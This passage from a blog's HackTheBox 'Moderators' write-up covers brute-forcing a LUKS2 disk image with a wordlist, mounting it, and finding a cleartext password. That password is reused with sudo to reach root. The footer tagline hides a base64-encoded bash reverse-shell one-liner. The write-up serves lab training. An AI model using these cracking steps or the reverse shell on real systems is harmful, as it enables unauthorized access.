</span></span><span style="display:flex;"><span>	Area offset:32768 <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>	Area length:258048 <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>	Digest ID:  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Tokens:
</span></span><span style="display:flex;"><span>Digests:
</span></span><span style="display:flex;"><span>  0: pbkdf2
</span></span><span style="display:flex;"><span>	Hash:       sha256
</span></span><span style="display:flex;"><span>	Iterations: <span style="color:#ae81ff">108683</span>
</span></span><span style="display:flex;"><span>	Salt:       cd <span style="color:#ae81ff">63</span> c4 d5 <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">42</span> ab a3 a5 a9 <span style="color:#ae81ff">98</span> ea <span style="color:#ae81ff">71</span> b0 fa cb 
</span></span><span style="display:flex;"><span>	           <span style="color:#ae81ff">91</span> 4c 1a e2 a0 8b 0a cc <span style="color:#ae81ff">25</span> 7a 8a c1 <span style="color:#ae81ff">54</span> b1 <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">39</span> 
</span></span><span style="display:flex;"><span>	Digest:     <span style="color:#ae81ff">79</span> 2e <span style="color:#ae81ff">78</span> f6 a1 2c <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">46</span> 2f 3a db 4b <span style="color:#ae81ff">68</span> 8a <span style="color:#ae81ff">18</span> 8d 
</span></span><span style="display:flex;"><span>	           <span style="color:#ae81ff">22</span> 7f d4 df <span style="color:#ae81ff">26</span> f2 <span style="color:#ae81ff">19</span> e2 f1 5b aa cc <span style="color:#ae81ff">13</span> f1 be <span style="color:#ae81ff">55</span> 
</span></span></code></pre></div><p>It appears to be <em>LUKS</em> version <em>2</em> encryption, and unfortunately at the time of doing this writeup, neither <em>hashcat</em> nor <em>john</em> support cracking this type, which means that I need to use a new tool, in my case 

<a href="https://github.com/glv2/bruteforce-luks" target="_blank"><em>bruteforce-luks</em></a>.</p>
<ul>
<li>Installation: <code>sudo apt install bruteforce-luks</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo bruteforce-luks -t <span style="color:#ae81ff">1</span> -f /usr/share/wordlists/rockyou.txt /dev/sdb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Tried passwords: <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>Tried passwords per second: 0.473684
</span></span><span style="display:flex;"><span>Last tried password: abc123
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password found: abc123
</span></span></code></pre></div><p>And the password is <em>abc123</em>.</p>
<p>I&rsquo;ll use <code>cryptsetup</code> to decrypt the image and then mount it, to be able to see its content:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo cryptsetup luksOpen /dev/sdb decrypted_vdi
</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> /dev/sdb: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sudo mount /dev/mapper/decrypted_vdi /mnt/
</span></span><span style="display:flex;"><span>$ cd /mnt/
</span></span><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:16 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">36864</span> Oct <span style="color:#ae81ff">14</span> 16:16 ..
</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">16384</span> Jul  <span style="color:#ae81ff">6</span> 19:13 lost+found
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">6</span> root root  <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:16 scripts
</span></span></code></pre></div><h2 id="finding-johns-password-and-escalating-to-root">Finding John&rsquo;s Password And Escalating To Root</h2>
<p>The first thing I&rsquo;ll do, is to search for passwords, using a simple <code>grep -Ri pass</code>, I got the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ grep -Ri pass
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>scripts/all-in-one/distro_update.sh:passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$_THE_best_Sysadmin_Ever_&#39;</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>I can notice that <em>scripts/all-in-one/distro_update.sh</em> contains a variable <em>passwd</em> that has the value <em>$<em>THE_best_Sysadmin_Ever</em></em>. Since John is an admin according to the messages read before, I will try to run <code>sudo -l</code> command and provide this as password:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john@moderators:~$ sudo -l
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> john: 
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> john on moderators:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User john may run the following commands on moderators:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> ALL
</span></span></code></pre></div><p>John user can run <em>All</em> commands as <em>root</em>, so I&rsquo;ll escalate to root using that:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john@moderators:~$ sudo su
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@moderators:/home/john# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@moderators:/home/john# cat /root/root.txt 
</span></span><span style="display:flex;"><span>1f2**************************636
</span></span></code></pre></div>
      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://mostxeon.github.io/tags/hackthebox/">HackTheBox</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/linux/">Linux</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/file-upload/">File-Upload</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/bruteforce/">Bruteforce</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/php/">PHP</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/bypass-file-extension-validation/">Bypass-File-Extension-Validation</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/burp-suite/">Burp-Suite</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/disable-functions/">Disable-Functions</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/uploading-files-curl/">Uploading-Files-curl</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/wordpress/">Wordpress</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/port-forwarding/">Port-Forwarding</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/chisel/">Chisel</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/mysql/">mysql</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/password-cracking/">Password-Cracking</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/hashcat/">Hashcat</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/bruteforce-luks/">bruteforce-luks</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/virtualbox/">VirtualBox</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/virtualbox-encryption/">VirtualBox-Encryption</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/luks2/">Luks2</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/clear-text-credentials/">Clear-Text-Credentials</a></span>
        <span class="tag"><a href="https://mostxeon.github.io/tags/password-reuse/">Password-Reuse</a></span>
        
    </p>

      
    <p>
        
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-antenna-bars-4" width="19" height="19" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round" id="IconChangeColor"> <path stroke="none" d="M0 0h24v24H0z" fill="none" id="mainIconPathAttribute"></path> <line x1="6" y1="18" x2="6" y2="15"></line> <line x1="10" y1="18" x2="10" y2="12"></line> <line x1="14" y1="18" x2="14" y2="9"></line> <line x1="18" y1="18" x2="18" y2="18.01"></line> </svg>

        
        
        <span class="difficulty"><a href="https://mostxeon.github.io/difficulty/hard/">Hard</a></span>
        
    </p>

      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        4880 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2022-11-03 14:54
        

         
          
        
      </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Moderators%20Write-Up&amp;caption=Moderators%20Write-Up&amp;canonicalUrl=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=Moderators%20Write-Up&amp;body=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f&amp;media=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f;description=Moderators%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f&amp;title=Moderators%20Write-Up&amp;summary=Moderators%20Write-Up&amp;source=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f&amp;resubmit=true&amp;title=Moderators%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f;title=Moderators%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=Moderators%20Write-Up%20https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f&amp;t=Moderators%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Moderators%20Write-Up&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fmoderators%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    
    <div class="pagination">
        
        <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
        </div>
        

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="https://mostxeon.github.io/posts/shared/">
                    <span class="button__icon">←</span>
                    <span class="button__text">Shared Write-Up</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="https://mostxeon.github.io/posts/trick/">
                    <span class="button__text">Trick Write-Up</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer id="socials" class="footer">
    <main aria-role="main">
        <div class="footer_author">
            
            
    
            <h2><a href="https://mostxeon.github.io/">Most Xeon</a></h2>
    
            
    <h6>YmFzaCAtaSA&#43;JiAvZGV2L3RjcC9EUkVBTS8xMzM3IDA&#43;JjE=</h6>
                <div class="social-icons-class">
                    &nbsp; <a href="https://twitter.com/" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a> &nbsp;&nbsp; <a href="mailto:mostxeon@gmail.com" target="_blank" rel="noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a> &nbsp;&nbsp; <a href="https://github.com/MostXeon" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a> &nbsp;
                </div>
        </div>
    </main>
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            
            <span><a href="https://mostxeon.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Tweaked from the one by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.923d14538da8896ffabde570adf70a56ac677c982dd4be31b4b4b65a67c17bfdb6f99d38228bea3c25e1205fd69abf149502492621047fe3a2c819646d50cb0b.js" integrity="sha512-kj0UU42oiW/6veVwrfcKVqxnfJgt1L4xtLS2WmfBe/22&#43;Z04IovqPCXhIF/Wmr8UlQJJJiEEf&#43;OiyBlkbVDLCw=="></script>



    </body>
</html>
